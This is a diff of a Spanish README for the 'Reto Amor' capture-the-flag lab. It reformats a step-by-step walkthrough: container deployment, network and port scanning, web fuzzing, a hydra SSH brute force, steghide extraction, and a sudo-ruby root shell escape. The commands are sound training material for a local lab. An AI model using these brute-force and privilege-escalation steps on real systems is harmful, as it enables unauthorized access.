@@ -30,59 +30,99 @@ Este repositorio documenta el desarrollo completo del laboratorio **Reto Amor** 
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-```bash
+
 ## 🛠️ Desglose de Comandos Utilizados
 
 
 # 1. Transferir carpeta
+
+```bash
 scp -r amor kali@192.168.1.12:/home/kali/Documents/
+```
 
 # 2. Instalar Docker (si aplica)
+
+```bash
 sudo apt install docker.io
+```
 
 # 3. Desplegar máquina
+
+```bash
 cd Documents/amor
 chmod +x auto_deploy.sh
 ./auto_deploy.sh amor.tar
+```
 
 # 4. Obtener interfaz de red
+
+```bash
 ip add
+```
 
 # 5. Escaneo de red en docker0
+
+```bash
 sudo netdiscover -i docker0 -r 172.17.0.0/24
+```
 
 # 6. Escanear puertos abiertos
-sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2
 
+```bash
+sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2
+```
 # 7. Fuzzing web
+
+```bash
 gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
 
 # 8. Fuerza bruta SSH
+
+![Fuerza Bruta](Fuerza bruta SSH.png)
+
+```bash
 hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
+```
 
 # 9. Acceso por SSH
-ssh carlota@172.17.0.2
 
+```bash
+ssh carlota@172.17.0.2
+```
 # 10. Buscar imagen
+
+```bash
 cd /carlota/Desktop/fotos/vacaciones
+```
 
 # 11. Descargar imagen a Kali
+
+```bash
 scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor
+```
+![Amor](AMOR.png)
 
 # 12. Extraer contenido oculto
-steghide extract -sf imagen.jpg
 
+![Decodificacion](stghide.png)
+
+```bash
+steghide extract -sf imagen.jpg
+```
 # 13. Decodificar mensaje oculto
+
+```bash
 echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo
+```
 
 # 14. Escalada de privilegios
+
+```bash
 su oscar
 sudo -l
 sudo /usr/bin/ruby -e 'exec "/bin/bash"'
-
 ```
-
-![Amor](AMOR.png)
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------
 
